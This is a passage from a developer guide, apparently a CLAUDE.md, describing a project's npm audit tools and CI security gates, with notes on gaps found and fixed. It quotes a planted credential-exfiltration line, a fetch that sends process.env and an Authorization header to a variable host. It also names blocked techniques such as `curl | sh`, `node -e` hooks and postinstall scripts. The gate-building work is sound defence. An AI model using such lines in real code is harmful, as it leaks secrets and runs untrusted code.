                         #   フル版と LITE 版の**両方**が要る。vite の emptyOutDir が dist/ を掃除するので
                         #   `build:web && build:web:lite` と続けると**フル版が消えて perf が落ちる** ——
                         #   フル版を退避してから lite を作ること (e2e.yml がその順序を持っている)。
                         #   `build:renderer` も vite なので、走らせるならブラウザ版より**前に**
npm run e2e:ollama       # Ollama 連携 E2E (スタブ Ollama + 実 chromium)。未起動/CORS未許可/接続成功の3状態
                         #   ほか計 7 状態。**undici は CORS を実装しない**ので、no-cors の到達確認が壊れる形は
                         #   単体検査に映らない —— 実ブラウザでしか見えない退行はここだけが捕まえる (パス 304)
npm run ollama           # Ollama CLI (ブラウザ不要・CORS 無縁)。`-- chat <model> "..."` で対話
npm run ollama:setup     # 導入→モデル取得→起動→1往復して確認。足りない段だけ埋める
                         #   `-- --check` で現状確認のみ / `-- --origin <URL>` でブラウザ許可も案内
npm run build:renderer   # tsc -b + vite build only (no packaging)
npm run build            # full desktop build: tsc -b, vite build, electron-builder installers
npm run typecheck        # tsc -b --noEmit --force (uses tsconfig project references)。
                         #   **eslint は型を見ない** (`parserOptions.project` も
                         #   `projectService` も無いので typescript-eslint は型情報なしで走る) ——
                         #   eslint.config.js の冒頭が自分で「Strict TypeScript is the primary
                         #   correctness gate (npm run typecheck)」と宣言しているとおり、
                         #   型の誤りを捕まえる網はこれ 1 つである。覆う範囲は
                         #   tsconfig.json の references から辿る 2 project の include だけ:
                         #   app = src/renderer・src/shared・src/__tests__、
                         #   node = src/main・src/preload・vite.config.ts・vitest.config.ts・
                         #   vitest.audit.config.ts・scripts/generate-dashboard.ts・
                         #   electron-builder.json。
                         #   最後の 1 つは TypeScript ではなく梱包設定だが、この写しは実物と
                         #   1 項ずつ照合されるので省かずに並べる。
                         #   **include の外の .ts は
                         #   1 行も検査されない** —— 2026-09-15 まで 4 ファイル
                         #   (src/__tests__ の検査 2 本 18 件・vitest.config.ts・
                         #   scripts/generate-dashboard.ts) が外に在り、型の誤りを植えても
                         #   tsc は 0 件だった (パス 278。vitest は esbuild で型を剥がすだけなので、
                         #   走っている検査の中で `undefined` を読んでも通る)。
                         #   母集団は `shared/__tests__/typecheckCoverage.test.ts` が
                         #   両方向に留める (覆われていない .ts が出れば落ち、exclude が
                         #   生えれば「教えろ」と落ちる)
npm test                 # vitest run (src/**/__tests__/ 。件数は docs/ARCHITECTURE.md の表が持つ
                         #   — 数を 2 か所に書くと必ず食い違うので、ここには書かない)
npm run audit:tick-sensitivity  # 固定回数で待つ検査が**その回数に依っているか**を実測する
                         #   (定期点検の道具 4 本目。CI では走らせない —— 判定のために
                         #   ソースを書き換えるし、落ちること自体は欠陥ではないため)。
                         #   固定回数の `settle` を持つ検査 (**2026-09-21 パス 385 の実測で 78 本**) の周回数を 0 にして
                         #   走らせ、**必ず元へ戻し** (`finally` + 内容で照合)、落ちたファイルを
                         #   理由つきの台帳と**双方向**に突き合わせる (**パス 385 で台帳は 0 本になった** ——
                         #   つまり 78 本のどれも周回数に依っていない。**0 本は「要らない」ではない**:
                         #   次に寄りかかった検査が入れば台帳に無いので落ち、寄せ終わった行を
                         #   消し忘れれば「落ちないのに台帳に在る」で落ちる)。
                         #   **綴りの針では足りないことが実測で分かったので足した** ——
                         #   パス 368 の `fixedTickAssertionCensus` の針は
                         #   `expect(text()).toContain(…)` (HEAD で 67 ファイル / 363 か所) を
                         #   1 件も見ておらず、逆に条件で待った後の主張まで数えていた。
                         #   台帳の形は `tickSensitivityLedger.test.ts` が毎回の npm test で見る
npm run audit:mutate-changed    # **`mutate` に載っているファイルを触ったら、そのファイルを測る**
                         #   (定期点検の道具 9 本目。CI では走らせない —— 1 ファイル 6 分半なので
                         #   毎 PR には載せられない。回すのは `mutate` のファイルを触ったパス自身)。
                         #   変更したファイル (既定は `HEAD~1` との差 + 作業ツリー) と
                         #   `stryker.config.json` の `mutate` (298 件) の**積**を取り、
                         #   その集合だけに Stryker を当てる。0 件なら何もせず exit 0。
                         #   ★ **なぜ要るか (実測)** —— `mutate` には `thresholds.break = 99.8` が
                         #   掛かるが、測定は**週次だけ** (`mutation.yml`)。パス 478 が
                         #   `sourceVerification.ts` に 1 関数足したら **98.92% / 未到達 1** になり、
                         #   **週次 CI が 6 日後に赤くなる**状態だった (しかも次に push した人の
                         #   変更に見える)。未到達は `String(url ?? '')` の `?? ''` 1 本で、
                         #   検査を 2 件足して **100.00% (Killed 93)** に戻した。
                         #   ★ **per-PR の網が見なかった理由も測った** —— `npm run test:cov` の
                         #   母集団は **`src/main/**` だけ**で、`mutate` 298 件のうち **247 件が
                         #   その外**に居る (税の計算 60 本以上・保管庫・プロキシ・コーパスの
                         #   確証器・76 画面)。**被覆の閾値はどこにも宣言されていない**
                         #   (`vitest.config.ts` に `thresholds` は 0 件・CLI も渡さない) ので、
                         #   実測 98.76% / 分岐 96.68% を**刷るだけ**で下がっても鳴らない。
                         #   ★ **閾値を足してもこの欠陥は捕まらない** —— 分岐は 1,903 本なので
                         #   **1 本 = 0.05%**。1 点の床でも 19 本落ちるまで鳴らない。
                         #   だから直しは「床を足す」ではなく「触ったファイルを測る」である。
                         #   ★ **後片付けは必須** —— `incremental: true` なので古い
                         #   `.stryker-incremental.json` は**偽の生存**を作る (2026-08 に
                         #   `atlassian.ts` が「生存 1」と誤報された実例が config に在る)。
                         #   `finally` で必ず消す。道具の形と母集団は
                         #   `shared/__tests__/mutateChangedTool.test.ts` が毎回の `npm test` で見る
npm run audit:gate-floors       # **ゲートの床**を振る舞いで測る (定期点検の道具 8 本目。
                         #   CI では走らせない —— 判定のためにソースを書き換えるし、
                         #   1 件あたりゲート 1 回ぶんの時間が掛かる)。
                         #   `git worktree` で HEAD の写しを作り、**母集団を空にして
                         #   終了コードを読む** —— 答えは終了コードだけで、出力の文面は
                         #   数えない (`audit:comment-blind --gates` と同じ判断)。
                         #   **綴りでは測れないので足した** —— 床の効き方は実測で
                         #   **7 通り** (`MIN_*` の定数・台帳の双方向・名指しの走査・
                         #   生成物の byte 一致・正典の値が計算不能・保護対象の不一致・
                         #   **副作用としての床**) あり、どの綴りを数えても取りこぼす。
                         #   2026-09-25 (パス 468) の初回実測: 空にする母集団を持つゲート
                         #   **33 / 37**・**直す前に 5 本が exit 0 だった**
                         #   (`verify:knowledge` はコーパスの 85% が消えても ✅・
                         #   `lint:sample-data` はソース側 0 件で ✅・`lint:test-coverage` は
                         #   「Checked 0 services」で ✅・`lint:collection-time` と
                         #   `lint:url-encoding` も 0 件で ✅)・**直した後は 33 / 33 が鳴る**。
                         #   ★ **空にする手は忠実でなければならない** —— 最初の測定は
                         #   宣言の**名前だけ**を替えたので、原文を読む走査には 76 件が
                         #   そのまま見えており、2 本を「床が無い」と誤って報告しかけた。
                         #   各手は `needle` を持ち、**当たらなければ落とす**
                         #   (「空にできなかった」を「床が在る」と読まない)。
                         #   母集団の種類は 11 種 (台帳 / コーパス / ソースツリー /
                         #   lockfile / git の追跡一覧 / 文書の参照 ほか) で、種類ごとに
                         #   空にする手が別物である。台帳の**形**は
                         #   `gateFloorLedger.test.ts` が毎回の `npm test` で見る
                         #   (`verify:all` のゲートと双方向・針が実物に当たること)
npm run audit:comment-blind     # **注記が答えになっている検査**を実測する
                         #   (定期点検の道具 7 本目。CI では走らせない —— 判定のために
                         #   ソースを書き換えるし、落ちること自体は欠陥ではないため)。
                         #   `.ts` / `.cjs` / `.js` の**注記の本文だけ**を無意味にし
                         #   (長さと改行は保つ・pragma と JSDoc のタグは残す)、`npm test` を
                         #   走らせ、**必ず元へ戻し** (`finally` + 内容で照合)、落ちた検査を
                         #   理由つきの台帳と**双方向**に突き合わせる。自己検査は
                         #   `stripComments(書き換え後) === stripComments(原文)` を全件で
                         #   確かめ、「触ったのは注記だけ」を証明してから走らせる。
                         #   **綴りでは数えられないので足した** —— 「この検査は注記に
                         #   騙されているか」は検査のソースに 1 字も書いていない。
                         #   2026-09-25 の初回実測: 1,428 本を書き換えると **13 ファイル /
                         #   15 件**が落ち、**11 本は設計どおり** (注記を読むのが仕事 /
                         #   内容ハッシュ)、**2 本が散文で満たされていた** ——
                         #   `lawCoverageLedger` の `shell-open-gate` (根拠が注記 1 行で、
                         #   しかもその注記は「使っていない」と述べていた) と
                         #   `limitCoverageCensus` の `MAX_STOCK_ADVISOR_RISK_CHARS`。
                         #   ★ **見えるのは片側だけ** —— 「不在を主張していて注記のせいで
                         #   偽に近かった検査」は逆に通ってしまうので映らない
                         #   (そちらは `absenceSampleCensus.test.ts` が別に持つ)。
                         #   `.tsx` は母集団の外 (JSX を本当に解析するまで · パス 464)。
                         #   台帳の形は `commentBlindLedger.test.ts` が毎回の npm test で見る。
                         #   ★ **`--gates` で CI の執行層も測る** (2026-09-25 · パス 466) ——
                         #   `verify:all` の 37 ゲートを**1 本ずつ**走らせて終了コードを比べる
                         #   (`&&` でまとめると先頭が落ちた時点で 3 番目から先が走らない)。
                         #   答え = 終了コードで、出力の差 (所要時間・PID・byte 数) は数えない。
                         #   実測 (2026-09-25): **素の木は 37 / 37 が exit 0・
                         #   注記を無意味にすると落ちるのは 5 / 37** で、5 本とも理由つきの
                         #   台帳に在る (`spawns-another-gate` / `prose-funds-the-budget` /
                         #   `reads-comment-directive` / `self-test-sample` / `content-hash`)。
                         #   ★ **そのうち 1 件が本物の欠陥だった** —— `lint:forbidden` の
                         #   免除の枠に散文が混ざっていた (下の出荷物の節に実測)
npm run audit:gate-partial      # **走査が「一部だけ」死んだときにゲートが鳴るか**を測る
                         #   (**同じ道具 (`audit-gate-floors.cjs`) の 2 つ目のモード** ——
                         #   道具の数は 8 本のまま。CI では走らせない —— 判定のために
                         #   ソースを書き換えるし、隔離した写し (`git worktree`) の上で
                         #   ゲートを何十回も走らせる)。
                         #   `audit:gate-floors` は母集団を**空**にする。**ところが床は
                         #   「0 件」にしか当たらない** —— 合計の床は実測の 10〜60% に
                         #   置かれているので、走査が一部だけ死んでも素通りする。
                         #   `scripts/lib/partial-scan-preamble.cjs` を入口に差し込んで
                         #   `readdirSync` から**ファイルの項目だけ**を落とし
                         #   (ディレクトリは落とさない —— 落とすと部分木ごと消えて
                         #   どれだけ死んだかが読めない)、終了コードを読む。
                         #   **落とす群はゲート本体の `REQUIRED_GROUPS` から読む** ——
                         #   道具の側にも群を並べると 2 つ目の台帳が静かに古びる。
                         #   ★ **母集団は道具の届く範囲で決まる** (2026-09-26 · パス 472) ——
                         #   前置きが包めるのは `readdirSync` と `git ls-files` の 2 通りなので、
                         #   母集団もその 2 つから走査で導く (`thinnableGates()` · 実測 **25 本**)。
                         #   パス 469〜471 は**手書きの 8 本**しか測っておらず、
                         #   **残り 17 本のうち 9 本が 1% の損失で黙っていた**。
                         #   群ごとの床はそれを宣言する 8 本だけ (弱くなっていない所に床を足さない)。
                         #   実測 (2026-09-26 · パス 472): **25 ゲート × 73 組すべてが台帳どおり**
                         #   (群ごと 48 組 + 一様な間引き 25 組)。直す前は 9 本が `silent`。
                         #   直す前は **`.tsx` 108 件 (= 画面そのもの) が消えても 5 本が
                         #   ✅ exit 0**・根 `scripts/` (102 件) が丸ごと消えても 3 本が ✅・
                         #   `docs/` (61 件) で 1 本が ✅ だった (パス 469)。
                         #   ★ **`git ls-files` の 2 本も測る** (パス 470) —— 前置きが
                         #   子プロセスの同期実行を包み、`AUDIT_PARTIAL_TARGET=git` で
                         #   **その一覧だけ**を殺す (両方殺すと `lint:shell` のフォールバックも
                         #   死んで、鳴った理由が「一覧が narrow された」から「木ごと消えた」へ
                         #   すり替わる)。pathspec つきの呼び出しは通す —— 間引くと
                         #   「権威に 2 度訊く」検査が永久に観測できなくなる。
                         #   ★ **一様な間引き (「任意の割合で死んだ走査」) も測る** ——
                         #   `keep` は**群ごとに**割合で間引き、**群の 1 件目は必ず残す**
                         #   (通し番号だと 1 件の群が位置で消え、ファイルを 1 つ足すだけで
                         #   答えが変わる揺れる測定になる)。★★ **パス 470 の実装は逆数しか
                         #   表せなかった** —— 歩幅 `round(100 / pct)` は `pct` が 51〜99 で
                         #   どれも 1 になり**何も落とさない**のに「kept 530/530」と刷るので、
                         #   `KEEP_PCT = 90` と書けば**「1 割落として鳴らなかった」と読める
                         #   記録が 1 件も落とさずに出る** (鳴らない対照を合格と読む形)。
                         #   パス 471 で真の割合へ直し、**`KEEP_PCT` を 50 → 99** へ
                         #   (いちばん尖った問い: 走査が 1% 死んだら鳴るか)。
                         #   直す前の実測は **99% で 6 / 6 が ✅ exit 0**・90% で 5 / 6・
                         #   75% で 4 / 6・50% で 2 / 6 で、50% で鳴った 4 本はどれも
                         #   合計の床が偶然半分をまたいだだけだった (床を 1 つ下げれば黙る)。
                         #   **直した後は 8 / 8 が鳴る** —— 木を歩く 6 本が
                         #   `scripts/lib/tracked-cross-check.cjs` で「追跡されていて条件に
                         #   合うファイルはどれも走査されている」を見るので**割合に依らない**。
                         #   期待値は `THINNING` 台帳が**測った値**で持つ (双方向)。
                         #   台帳の形は `populationGroupFloor.test.ts` が毎回の npm test で見る
                         #   (`ENFORCEMENT` が機構を `shared-floor` / `cross-check` /
                         #   `tracked-cross-check` の**配列**で名乗り、名乗った機構の実在まで
                         #   見る。逆向き ——「呼んでいるのに名乗らない」—— は
                         #   `trackedCrossCheck.test.ts` が見る)
npm run audit:gate-baseline      # **道具そのものが測る対象に見えていないか**を測る
                         #   (`audit-gate-floors.cjs` の 3 つ目のモード —— 道具の数は 8 本のまま。
                         #   CI では走らせない。**道具を変えた日に回す**)。
                         #   比べるのは「素の実行」と「前置きを差し込んで **1 件も落とさない**
                         #   実行」。間引きを掛けないので、差が出たらそれは**道具の副作用**
                         #   (差し込んだ 1 行・strict mode の喪失・自分の原文のハッシュ) である。
                         #   ★ **これは `--partial` の前提を測る検査** —— 透明でないゲートの
                         #   間引きの答えは「ゲートが気付いた」の証拠にならない。
                         #   注入は **`NODE_OPTIONS=--require`** で、**原文を 1 byte も
                         #   書き換えない** (パス 474)。パス 473 までは行 0 に差し込んでおり、
                         #   それが道具を 2 本のゲートに見せていた ——
                         #   `chain:verify` は `integrity-chain.cjs` が**それ自身が保護対象**
                         #   なので 1 行足すとハッシュが合わず exit 1 (**原理的に測れなかった**)、
                         #   `verify:arch` は足した 1 行を `tracked line count` に数えた。
                         #   実測: **パス 473 は透明 23 / 見えている 2 → パス 474 は 25 / 0**。
                         #   `chain:verify` はこれで**初めて測れた** (答えは `not-dropped` ——
                         #   母集団が名指しの一覧なので落とせない、という 1 つの理由だけが残る)。
                         #   ★ **報告はプロセスごと** (`<OUT>/<pid>.json`) —— `NODE_OPTIONS` は
                         #   子に伝わるので 1 つのファイルだと最後に終わった子が親を上書きする
                         #   (実測: `verify:arch` の報告が `kept: 0, dropped: 0` になった)。
                         #   ★ **報告は木の外** —— 木の根に置くと走査がその 1 件を数える
                         #   (実測: `lint:charset` が 1663 → 1664)。終了コードは 25 / 25 で
                         #   動かないので**罠であって生きた欠陥ではない**が、`reportDirFor` が
                         #   不変条件として持ち self-test が標本で見る。
                         #   ★ 台帳 (`TRANSPARENCY`) に載せるのは**見えている物だけ**で、
                         #   **2026-09-26 から 0 件**。床は「0 件でない」には置かない
                         #   (減るのが正しい向き · パス 378) —— 機構が生きていることは
                         #   **合成のゲート名**の標本が見る。台帳の形と判定の順序は
                         #   `populationGroupFloor.test.ts` が毎回の `npm test` で見る
npm run audit:e2e-wait-margin   # e2e の待ちが**制限にどれだけ近いか** (実測 ÷ 制限) を測る
                         #   (定期点検の道具 5 本目。CI では走らせない —— 落とさない道具で、
                         #   薄い余裕は欠陥ではなく手がかりである)。記録子は
                         #   `scripts/e2e/core.cjs` の `installWaitMarginRecorder` で、
                         #   **`SERVICE_HUB_E2E_WAIT_MARGIN=<path>` が無ければ何もしない**
                         #   (常時有効にすると全 suite に費用が乗り、落ちたときの stack に
                         #   包みが挟まる)。捕るのは**連鎖の中で** ——
                         #   `perf` → `SERVICE_HUB_E2E_WAIT_MARGIN=… npm run e2e` →
                         #   同じく `e2e:lite` → `npm run audit:e2e-wait-margin -- <json> <json>`。
                         #   **「再現」の代わりに使う** —— 時間切れは「いちばん余裕の無い待ち」
                         #   から順に起きるので、落ちるのを待つ (1 反復 ≒ 15 分・外れたら何も
                         #   分からない) 代わりに余裕を測れば**どちらに転んでも結論が出る**:
                         #   制限の大半を使う待ちが在ればそれが容疑者 (直しは「制限を上げる」か
                         #   「遅い原因を直す」に決まる)、どれも数 % なら**原因は待ちの側ではない**。
                         #   畳むのは**最大**で、平均ではない (時間切れは最悪の 1 回で起きる)。
                         #   2026-09-22 (パス 397) の実測は上の出荷物の節に在る
npm run test:watch       # vitest watch mode
npm run lint             # eslint . --max-warnings 0 (flat config in eslint.config.js, ESLint 9 + typescript-eslint)
npm run smoke            # xvfb + Electron screenshot smoke test of every page
npm run smoke:app        # 実物の `electron .` を起動して 8 秒生きているか
                         #   (主プロセス dist-electron/main.js を通す唯一の検査)
npm run scaffold -- <id> "<Label>" <ICON> [bearer|oauth|json]   # generate a new service end-to-end
```

Run a single test: `npx vitest run path/to/file.test.ts`, or filter by name: `npx vitest run -t "pattern"`.
Vitest config is in `vitest.config.ts` (node environment).

### Custom quality gates (all run in CI — keep them green)

```bash
npm run verify:arch        # docs/ARCHITECTURE.md file:line refs + live metrics must match reality
npm run lint:imports       # main / preload / renderer import-boundary enforcement
npm run lint:forbidden     # forbidden patterns (nodeIntegration: true / contextIsolation: false /
                           #   sandbox: false / webSecurity: false / eval / innerHTML ほか 38 種)
npm run lint:workflow-security # .github/workflows/: permissions の明示・第三者 action の SHA 固定・
                           #   pull_request_target 禁止・run: への信用できない値の埋め込み
npm run lint:network-targets # 送り先ホストが変数で決まる通信の台帳 (資格情報の流出経路)。母集団は 3 つ ——
                           #   ① 組み立て (テンプレートのホスト部が変数) 11 件 ② 丸ごと変数の送り先 6 件 ——
                           #   この 2 つは `src/` の `.ts`/`.tsx` だけを見る —— そして
                           #   ③ **`src` の外の網の口 3 件 (全件)** (パス 342)。
                           #   ③ が別立てなのは実測による: 走査を木全体へ広げると 20 件出るが
                           #   **真陽性は 0 件** (全部ゲート自身の self-test の標本) で、
                           #   `src` の外に実在する 3 件は**どれも送り先が素の識別子**なので
                           #   ①② が設計上見ない —— **広げても 1 件も見えない**。
                           #   ③ は「変数か」を問うのをやめ全件を守りつきで台帳に載せる。
                           #   **2026-09-20 まで ③ が無く、`scripts/` に
                           #   `fetch(\`https://${host}/v1/collect\`, { headers: { Authorization },
                           #   body: JSON.stringify({ env: process.env }) })` を植えても
                           #   37 ゲートすべてが exit 0 だった** (同じコードを `src/` へ置くと鳴る ——
                           #   差は検出器ではなく走査範囲だけ)。`scripts/` は CI で走り、
                           #   release.yml の梱包ステップは署名鍵を env に持つ
npm run lint:docs          # cross-document consistency
npm run lint:citations     # 出典の内部矛盾 (同一 DOI が別々の出版年・別々の著作で引かれていないか)、
                           #   種別の偽装 (雑誌・ブログ・百科事典・目録/書店/検索結果の URL に
                           #   'academic' が付いていないか)、同じ URL は同じ種別 (項目ごとに
                           #   'academic' / 'media' が揺れていないか)。**加えて URL のスキーム** ——
                           #   `http:` / `https:` 以外 (`javascript:` `data:` `file:` ほか) は
                           #   **例外なく落とす**。平文 http は台帳制で、載っていない新しい物は
                           #   落ち、消えた物が台帳に残っても落ちる (双方向)。
                           #   2026-09-15 まで、この行はスキームの規則に触れておらず
                           #   **ゲートより狭く書かれていた** (パス 277。過小申告は
                           #   偽の主張より軽いが、守られている物を守られていないと読ませる)
npm run lint:doi-prefix    # DOI プレフィックス(=登録機関=出版社) とラベルの出版社の矛盾。
                           #   ISSN を埋め込む DOI (APA / Elsevier PII / Wiley j. / SAGE) は台帳 164 誌で、誌の略号を
                           #   持つ DOI (INFORMS / Oxford / Wiley / Springer / Annual Reviews / MIT / Emerald) は
                           #   台帳 153 誌で誌名も照合し、ISSN の検査数字も検算する (1 回しか引かれない誤 DOI を拾う)
npm run lint:charset       # 他文字種 6 ブロック (キリル / ハングル / アラビア / タイ /
                           #   デーヴァナーガリー / ヘブライ) と簡体字の混入
                           #   (CJK は共有ブロックなので字を列挙するしかない)。
                           #   **加えて制御・不可視文字の 4 群** —— C0/DEL・C1・
                           #   **双方向制御 (Trojan Source · CVE-2021-42574)**・不可視文字
                           #   (SHY / ZWSP / U+2060-2064 / BOM)。双方向制御は
                           #   **読める物と走る物が違うソース**を作れるので攻撃手法であり、
                           #   レビューでは見えない。ZWJ / ZWNJ は絵文字の連結に要るので
                           #   **意図して外す**。正当な出現 (NUL の標本・不可視文字を剥がす
                           #   検査の標本・CSV の BOM) は ALLOWLIST に件数と理由つきで載る。
                           #   2026-09-15 まで、この行は制御・不可視の 4 群に 1 字も触れて
                           #   おらず、**ゲートより狭く書かれていた** (パス 279。同じ CLAUDE.md
                           #   の出荷物の節には 2026-09-14 から書かれていたので、
                           #   1 つの文書が同じ事実を一方で述べ他方で落としていた)
npm run lint:knowledge-refs # 裁定台帳が実在しない知識 id を参照していないか
npm run lint:mcp-servers   # `.claude/settings.json` の**実行面 2 つ**を台帳と突き合わせる。
                           #   ① `mcpServers` 25 件 —— `npx -y` / `uvx` で**その時の最新**を取って
                           #   能力つきで走る (リポジトリの木・git・保管庫・ローカル DB)。
                           #   起動子は npx / uvx のみ・名前空間の無いパッケージは件数に上限・
                           #   素の名前かつ資格情報を受け取る物は名指しの台帳。
                           #   ② **`hooks` (2026-09-21 · パス 370 で足した)** —— セッション開始の
                           #   たびに走るコマンド。形は `node scripts/<name>.cjs` **だけ**
                           #   (シェルの一行・`curl | sh`・`npx` は形で落ちる)・指す script の実在・
                           #   理由つきの台帳と双方向。
                           #   ③ **最上位の鍵は知っている 2 つだけ (fail closed)** ——
                           #   設定は `statusLine` など別の実行面を後から増やせるので、
                           #   「見る鍵を挙げる」形だと 3 つ目が静かに入る。
                           #   **2026-09-21 まで ② と ③ が無く、hook のコマンドを
                           #   `node -e "…"` に替えても 37 ゲートすべてが exit 0 だった。**
                           #   実物がこの規則の下に居ることは
                           #   `shared/__tests__/sessionStartCodeGuarded.test.ts` が npm test で見る
npm run lint:test-coverage # サービスごとに `<id>.test.ts` が在り、**登録済みの action が
                           #   すべてその中でクォート付きで現れる**こと。加えて `LIVE_ACTIONS` の
                           #   各項はクライアントの `ACTIONS` を指す識別子ただ 1 つで (index.ts に
                           #   直書きした action は検査を素通りする)、`ACTIONS` を export する
                           #   クライアントは全部 `LIVE_ACTIONS` に載る (逆向き)。
                           #   **action を持たないサービスは許される** —— 2026-09-15 実測で
                           #   **76 のうち 48 が action を 1 つも登録していない** (ゲートの
                           #   self-test にも「テストはあるが action 0 件 → 0 件鳴る」が在る)。
                           #   2026-09-15 まで、この行は「every service must have a test +
                           #   an action registered」と書かれていた —— **後半は偽**で、
                           #   死んだ action を消せない理由として実際に私が引用した (パス 275)
npm run lint:csp           # 出荷 HTML の CSP を**実物**に当てる (self-test のみ verify:all。
                           #   成果物への適用は ci.yml が inject-pwa 適用後に行う)。
                           #   雛形側 (index.html / inline-html.cjs の buildCsp) は
                           #   `shared/__tests__/shippedCsp.test.ts` が既に留めている ——
                           #   こちらが見るのは **注入後の公開ファイル** と landing / デモ 3 本。
                           #   **CSP を書く builder は実測 8 本**で、この門が CI で当たるのは
                           #   `pages.yml` が publish する 4 本だけ —— 残り 4 本
                           #   (経営書類スタジオ / 業務自動化ダッシュボード / 就業規則メーカー /
                           #   電子定款メーカー) は**利用者がダウンロードして開く単一ファイル**で、
                           #   CI では 1 度も組まれない。2026-09-20 (パス 344) まで
                           #   **この 4 本はどのゲートにも触られていなかった**
                           #   (`--document` を当てると 4 本とも通る —— 欠けていたのは
                           #   それを保つ物のほう)。母集団と 8 本それぞれの合否は
                           #   `shared/__tests__/artifactCspCensus.test.ts` が
                           #   **門の `evaluate` を借りて**両方向に留める (対照 2 方向)。
                           #   注入口 (`innerHTML` ほか) は `lint:forbidden` が
                           #   `scripts/` を含めて 0 件で留めているのでそちらは数えない
npm run lint:deps          # 依存の供給網 (本番依存の閉包 5 件 / インストール時コード 3 件 /
                           #   **セキュリティの床 4 件** の台帳・取得元は registry のみ・integrity 必須。
                           #   本番依存は単一 HTML へ畳み込まれ保管庫と同じオリジンで走るので、
                           #   増やすなら理由を書く。床は「上流が直るまで自分で押さえている版」で、
                           #   道 (overrides / devDependencies の範囲) を問わず 1 つの台帳に載せ、
                           #   宣言の消失・指定の緩み・lockfile の解決版 (入れ子の複製も) を見る。
                           #   **床が今日の勧告にまだ十分かは網が要る** → `npm run audit:floors`
                           #   (CI では走らせない。定期点検の道具)。
                           #   規則は全部で **9 本** —— 上に書いた 5 本のほかに
                           #   ① **lockfile が読めてパッケージ数が床以上** (実測 647 / 床 400。
                           #   走査が死んで「0 件だから健全」にならないため)・
                           #   ⑥ **台帳の理由が空でないこと**・そして 2026-09-21 (パス 371) に足した
                           #   ⑧ **このリポジトリ自身の lifecycle script** (双方向・今日 0 件) と
                           #   ⑨ **インストール時に読まれる設定ファイル**
                           #   (`.npmrc` / `.yarnrc` / `.yarnrc.yml` / `.pnpmfile.cjs` /
                           #   `npm-shrinkwrap.json`・双方向・今日 0 件) が在る。
                           #   **規則 3 は lockfile の `hasInstallScript`、つまり依存の側しか
                           #   見ていなかった** —— 実測 (2026-09-21) で `npm ci` は root の
                           #   `postinstall` と `prepare` を**どちらも走らせる**のに、
                           #   `"postinstall": "node -e …"` を足しても `.npmrc` に
                           #   `registry=` を書いても **37 ゲートすべてが exit 0** だった。
                           #   実物がこの規則の下に居ることは
                           #   `shared/__tests__/installTimeCodeGuarded.test.ts` が npm test で見る。
                           #   **`package.json` は鎖には入れない** —— 全履歴 12 コミットで
                           #   「安定資産」の基準 (パス 347) を満たさないので、門で形を見る
npm run lint:storage       # ブラウザに残す物の台帳 (IndexedDB 4 / Cache Storage 1 /
                           #   localStorage 22 / sessionStorage 4。cookie と OPFS は 0 件だが走査はする)。
                           #   新しい保存先が黙って増えないこと・バックアップが覆うのは 1 つだけ・
                           #   **媒体そのものが `docs/DATA_PROTECTION.md` の在庫に載っていること**・
                           #   **ハードリセット (すべてのデータを削除) が台帳の全行を覆うこと** (規則 11、パス 136)
                           #   **入口 (`data/localWrite.ts`) へ流れる鍵は、入口の登録が名乗る鍵と一致すること**
                           #   (規則 12・双方向、パス 310 —— 登録は「新しい呼び出し元を足したら鍵をここへ書く」と
                           #   散文で言い、4 つのうち 2 つが書かれないまま鳴らなかった。直接の getItem が同じ鍵を
                           #   名乗って規則 3 を満たしていたため。呼び出しから鍵を解いて突き合わせる)
npm run lint:shell         # **追跡されている `.sh` すべて** (git ls-files。`scripts/` 直下だけを
                           #   読んでいた頃は `tools/deploy.sh` や `scripts/ci/foo.sh` が死角だった ——
                           #   git が使えない環境では `scripts/` 直下に落とすが、黙って 0 件にはしない)。
                           #   ★ **落ちるのは `catch` (git が使えない) のときだけ** (パス 470) ——
                           #   直す前の引き金は「一覧に `.sh` が 0 件」で、「git が居ない」と
                           #   「一覧が narrow された」を見分けられず `scripts/` 直下から**詰め直して**
                           #   「Checked 9 (追跡ファイル全体から収集)」と刷っていた (成功行そのものが偽)。
                           #   成功行は**実際に使った出どころ**を名乗る。
                           #   ★ **権威に 2 度訊いて一致を要求する** (`crossCheckProblem`) ——
                           #   `git ls-files -z` を自分で濾した答えと `git ls-files -z -- *.sh` が
                           #   同じ集合でなければ落ちる。**床では見えない「1 本だけ落ちた」形**が
                           #   これで鳴る (実測: `curl … | sh` を持つ本を 1 件落としても
                           #   直す前は ✅ exit 0「Checked 8」だった)。
                           #   母集団は `trackedPopulationWitness.test.ts` が外側から
                           #   独立に数えて双方向に突き合わせる。
                           #   規則 6 本: ① bash shebang が 1 行目 ② `set -euo pipefail` が行頭
                           #   (関数の中だけでは「このスクリプトは strict」と言えないので行頭アンカー)
                           #   ③ `bash -n` 構文 ④ **遠隔コードの実行 (`curl | sh`) は台帳のみ** ——
                           #   取得元が入れ替われば任意コードが利用者の権限で走るので、
                           #   「何を・どれくらい固定して・なぜ」を書く (今 2 本: nvm と ollama の install.sh)
                           #   ⑤ **後戻りできない書き込みと秘密の扱いは台帳のみ** (双方向 —— 危ない操作が
                           #   無くなったのに台帳に残っていても落ちる。古い登録は次に足された 1 本を隠す)
                           #   ⑥ **台帳に載った本の `--self-test` を実際に走らせる** (自己テストを書いても
                           #   誰も走らせなければ「在るのに何も守っていない検査」になる ——
                           #   ci.yml に無いゲート・主プロセスを通さない smoke と同じ形)。
                           #   2026-09-15 まで、この行は「scripts/*.sh: bash -n + strict mode」だけで、
                           #   **母集団も規則 ④⑤⑥ も落としていた** (パス 279。落ちていた 3 本が
                           #   供給網・破壊的操作・秘密という一番重い側である)
npm run lint:mutation-scope # 変異検査の「測っていない範囲」の台帳 (広い Stryker disable と、
                           #   **理由が書かれていない pragma** —— 無言の pragma はその行の変異体を
                           #   消すので、測っていない範囲が「100%」として報告される)。
                           #   加えて**名簿どうしの突き合わせ** —— 「必ず測る壁」(`MUST_MEASURE`
                           #   実測 35 件) が改竄検知の保護対象であること。
                           #   ★ 2026-09-26 (パス 476) まで、この検査は `PROTECTED` と
                           #   `DEP_EXCLUSIONS` を**どちらでもよい**として受けていた ——
                           #   2 つの台帳は逆のことを意味する (前者は「中身のハッシュを取る」、
                           #   後者は「取らないと決めた」) のに、断りの文面まで
                           #   「PROTECTED へ足すか、DEP_EXCLUSIONS に理由つきで載せること」と
                           #   **移動を正当な手当てとして案内していた**。実測: ブラウザ版の保管庫
                           #   `src/renderer/security/vault.ts` (この名簿にも壁として載っている) を
                           #   移して鎖に宣言つきで append すると `chain:verify` も
                           #   `lint:mutation-scope` も **exit 0** で、以後その中身を書き換えても
